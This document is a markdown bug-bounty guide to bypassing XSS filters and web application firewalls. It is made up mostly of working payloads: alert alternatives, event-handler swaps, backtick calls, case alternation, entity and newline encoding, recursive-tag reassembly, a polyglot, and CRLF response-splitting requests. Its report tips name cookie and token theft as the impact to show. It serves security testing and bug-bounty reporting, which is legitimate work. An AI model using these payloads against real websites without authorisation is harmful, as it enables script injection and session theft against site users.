# XSS Filter & WAF Bypass Techniques

When a target reflects input but a filter, sanitizer, or WAF blocks standard payloads, the goal is to evade pattern matching while keeping the payload executable. Knowing these evasions turns a "reflected but not firing" finding into a working XSS, which is usually the difference between informational and a paid report. Severity depends on what the bypass ultimately achieves — any filter circumvention demonstrated with script execution in a victim context is a valid vulnerability.

General XSS hunting workflow lives in [Xss.md](./Xss.md); CSP-specific evasions live in [Bypass_CSP.md](./Bypass_CSP.md).

## Hunting Checklist

1. Start minimal (`'>`, `<svg onload=1>`) to learn *what layer* blocks you: reflection (encoded/stripped), keyword filtering, or WAF (403/405/block page).
2. Replace blocked primitives one at a time: blocked `alert()` → alternatives; blocked `onerror` → other handlers; blocked `()` → backticks.
3. Work through encoding and case evasions (entity, double-encoding, newline, tab) if keywords are blacklisted.
4. Test whether filtering is recursive by nesting tags; test whitespace rules with `/` and `•`.
5. If GET is filtered, switch the request method; if a WAF blocks the path, probe CRLF/response splitting carefully.
6. Fingerprint the WAF with WhatWaf and search for known public bypass payloads for it (see Resources).
7. Confirm each idea against [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) / [OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) cheat sheets before assuming a filter is unique.

## Test Cases & Examples

### Alternatives to `alert()`

Many applications block `alert()`. Use one of:

- **`confirm()`** instead of `alert()`
- **`prompt()`** instead of `alert()`
- **`console.log()`** instead of `alert()` (silent proof — check devtools)
- **`eval()`** instead of `alert()`

```html
<script>confirm(1)</script>
<img src=x onerror=prompt(1)>
<script>console.log(1)</script>
```

### Alternatives to the `onerror` event handler

If `onerror` is blocked, trigger script execution with other handlers: `onload`, `onfocus`, `onmouseover`, `onblur`, `onclick`, `onscroll` — embedded in HTML elements so the event fires naturally:

```html
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<svg onload=alert(1)>
<div onmouseover=alert(1)>hover me</div>
```

### Handling parentheses filtering

If `()` are filtered, backticks work in most engines (template literals still call the function — effective against weak sanitizers that only block standard calls):

```html
<script>alert`1`</script>
<img src=x onerror=alert`1`>
<img src=x onerror=prompt`1`>
javascript:prompt`1`
javascript:alert`1`
```

### HTML entities instead of raw `<` / `>`

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

### XSS polyglot

```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

Full list: [XSS Polyglots](https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626)

### Bypassing lowercase filtering (case alternation)

```html
<scRipT>alert(1)</scRipT>
```

### Breaking firewall regex with new lines

```html
<script>%0alert(1)</script>
```

### Double encoding

```text
%2522
```

### Recursive-filter bypass (stripped keyword reassembles)

```html
<src<script>ipt>alert(1);</scr</script>ipt>
```

### Anchor tag injected without whitespace

```html
<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
```

### Whitespace filtering bypassed with a bullet (`•`)

```html
<svg•onload=alert(1)>
```

### Changing request method (filter applied per-method)

```http
GET /?q=xss HTTP/1.1
Host: target.com
```

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

q=xss
```

### CRLF injection / HTTP response splitting

```http
GET /%0A%0DValue=%20Virus HTTP/1.1
Host: target.com
```

## Bypass Techniques

- Combine layers: case alternation + entity encoding + backticks, or `<svg/onload>` with `/` as the "whitespace" separator.
- If a keyword regex spans quotes (e.g. `src="`), remove quotes: `<img src=javascript:alert(1)>`.
- Non-printable separators (`%09` tab, `%0a` newline, `&Tab;`, `&NewLine;`) break naive substring rules.
- Move context instead of fighting the filter: path segments, `#` fragments, HTTP headers reflected in pages, JSON responses rendered client-side (DOM XSS — see [post_message_xss.md](./post_message_xss.md)).
- WAF-specific rules are often published — Twitter-search the WAF name + "bypass" and check [Awesome-WAF](https://github.com/0xInfection/Awesome-WAF).
- If `script-src` CSP blocks execution after a successful injection, continue in [Bypass_CSP.md](./Bypass_CSP.md).

## Tools & Resources

- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [XSS Polyglots gist (michenriksen)](https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626)
- [WhatWaf](https://github.com/Ekultek/WhatWaf) · [Awesome-WAF](https://github.com/0xInfection/Awesome-WAF)
- Contact for discussions: **[@Fani Malik](https://twitter.com/fanimalikhack/)**

## Report Tips

- Bypass payloads are noise; the finding is *script execution* — include the final working payload, exact URL/request, and which filters were evaded.
- Show the impact chain (cookie/token theft, action as victim), not just `alert(1)`; a stored context with a WAF bypass is a strong high.
- Include the blocked baseline (original payload that returned the filter/403) next to the working bypass so triage can reproduce both.
